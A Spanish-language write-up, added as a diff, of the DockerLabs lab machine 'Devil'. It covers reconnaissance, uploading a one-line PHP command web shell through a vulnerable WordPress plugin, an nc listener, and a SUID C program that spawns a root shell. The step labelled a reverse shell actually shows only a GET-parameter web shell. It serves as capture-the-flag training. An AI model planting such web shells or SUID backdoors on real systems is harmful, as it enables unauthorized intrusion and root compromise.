@@ -1,0 +1,216 @@
+---
+title: Devil
+description: Resolución completa de la máquina virtual *Devil* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **Devil**, desarrollada por *kaikoperez* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
+El laboratorio expone un servidor web con WordPress que contiene un plugin malicioso llamado `backdoor` que permite la subida arbitraria de archivos sin validación. Esta funcionalidad permite subir una reverse shell en PHP y obtener ejecución remota de comandos como `www-data`.
+Una vez dentro, se identifica un binario `ftpserver` que otorga acceso al usuario `lucas`. Posteriormente, se encuentra un juego de adivinanzas con un binario SUID que, al introducir el número correcto, otorga una shell con privilegios de `root`.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'Devil',
+    Autor: 'kaikoperez',
+    Dificultad: 'Media',
+    Fecha: '12/05/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip Devil.zip
+sudo bash auto_deploy.sh Devil.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p Devil/{content,exploits,nmap,scripts}
+cd Devil
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1769404894/Ports_ek3ndv.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p80 172.17.0.2 -oN targeted
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios:
+
+```bash
+feroxbuster -u http://172.17.0.2/ \
+  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt \
+  -x php,html,txt,js -t 100 -C 404
+```
+
+La página principal muestra WordPress. Se agrega el dominio al `/etc/hosts`:
+
+```bash
+echo "172.17.0.2 devil.lab" | sudo tee -a /etc/hosts
+```
+
+Se realiza un escaneo con `wpscan` sin resultados relevantes. Posteriormente, se identifica el directorio:
+
+```
+/wp-content/plugins/backdoor
+```
+
+![Backdoor](https://res.cloudinary.com/dewqswzke/image/upload/v1769411196/Backdoor_xhjhs7.png)
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Subida de reverse shell
+
+El plugin `backdoor` permite subir archivos sin validación. Se sube una reverse shell en PHP:
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+Se inicia un listener:
+
+```bash
+nc -nlvp 443
+```
+
+Se accede al archivo subido:
+
+```
+/wp-content/plugins/backdoor/uploads/shell.php
+```
+
+![Reverse shell](https://res.cloudinary.com/dewqswzke/image/upload/v1769411197/ReverseShell_bsemfg.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De www-data → lucas
+
+Se enumera el directorio de `/home` y se encuentra el binario:
+
+```
+/home/andy/.secret/ftpserver
+```
+
+Al ejecutarlo, se obtiene una shell como `lucas`:
+
+![Ftpserver](https://res.cloudinary.com/dewqswzke/image/upload/v1769411196/FtpserverLucas_onb738.png)
+
+### 3.2 De lucas → root
+
+En `/home/lucas/.game` se encuentran `game.c` y `EligeOMuere` (binario compilado).
+
+**game.c:**
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main() {
+    int guess;
+    int secret_number = 7;
+
+    printf("¡Bienvenido al juego de adivinanzas!\n");
+    printf("Adivina el número secreto (entre 1 y 10): ");
+    scanf("%d", &guess);
+
+    if (guess == secret_number) {
+        printf("¡Felicidades! Has adivinado el número.\n");
+        printf("Iniciando shell como root...\n");
+        setuid(0);
+        system("/bin/bash");
+    } else {
+        printf("Número incorrecto. Intenta de nuevo.\n");
+    }
+
+    return 0;
+}
+```
+
+El binario es SUID y cambia el UID a root si se introduce el número `7`:
+
+```bash
+./EligeOMuere
+# Introducir: 7
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1769411197/Root_iokcpo.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Plugin WordPress con subida arbitraria de archivos",
+      severity: "Crítica",
+      impact: "Ejecución remota de comandos como www-data"
+    },
+    {
+      vulnerability: "Binario ftpserver con privilegios elevados",
+      severity: "Alta",
+      impact: "Movimiento lateral al usuario lucas"
+    },
+    {
+      vulnerability: "Binario SUID con setuid(0) y número fijo",
+      severity: "Crítica",
+      impact: "Escalada directa de privilegios a root"
+    }
+  ]}
+/>
